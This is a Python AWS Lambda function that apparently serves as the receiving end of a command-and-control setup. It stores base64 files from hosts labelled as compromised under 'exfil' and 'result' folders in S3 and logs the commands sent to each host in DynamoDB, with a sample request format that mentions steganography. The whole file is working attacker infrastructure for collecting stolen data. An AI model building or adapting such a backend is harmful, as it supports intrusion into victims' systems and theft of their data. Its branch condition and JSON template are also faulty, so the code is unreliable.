import json, boto3, time, base64, os

def lambda_handler(event, context):
    client=boto3.client('dynamodb')
    s3 = boto3.client('s3', region_name='us-east-2')

    try:
        jsonEvent = json.loads(event['body'], strict=False)
        # This except has to exist for testing
    except:
        jsonEvent = event

    results = []
    bucket = os.environ['BUCKET']

    # Start placing all the JSON request into the proper values
    try:
        action = jsonEvent['action']
        table = jsonEvent['table']
        item = jsonEvent['item']
    except Exception as error:
      return {
        'statusCode': 404,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(str(error))
      }
    
    try:
        # Get the filename and content of the file
        fileName = item['filename']['S'] 
        encodedContent = item['content']['S']

        # Decode the file
        content = base64.b64decode(encodedContent)

        # Post the file to the s3
        if 'String' not in action or 'Error' not in action:
            key = 'compromised/' + table + "/result/" + fileName
            s3Response = s3.put_object(Bucket=bucket, Key=key, Body=content, Metadata={'action':item['command']['S']})
        else:
            key = 'compromised/' + table + "/exfil/" + fileName
            s3Response = s3.put_object(Bucket=bucket, Key=key, Body=content)
            # Adds an entry so that we can place the entire JSON into the DB while removing the file content
            item['result']['S'] = item['filename']['S']
        
        del item['content']

        results.append('Adding the file to the bucket')

    except Exception as error:
      return {
        'statusCode': 404,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(str(error))
        }   
    
    # Add the entry to the table
    try:
      response=client.put_item(TableName=table, Item=item)
      results.append('Adding entry into table')
    except Exception as error:
      return {
        'statusCode': 404,
        'headers': {'Content-Type': 'application/json'},
        'body': json.dumps(error)
      }

    # Return statuses
    return {
      'statusCode': 200,
      'headers': {'Content-Type': 'application/json'},
      'body': json.dumps(results)
    }

# JSON format
'''
{
  "action": "action",
  "table": "hostname",
  "item": {
    "commandTime": {
      "N": "number"
    },
    "command": {
      "S": "command"
    },
    # Result is optional and is only used for stego
    # This function will add it for exfil
    "result": {
      "S": "results"
    },
    "filename": {
      "S": "filename"
    }
    "content": {
      "S": "content"
    }
  }
}
'''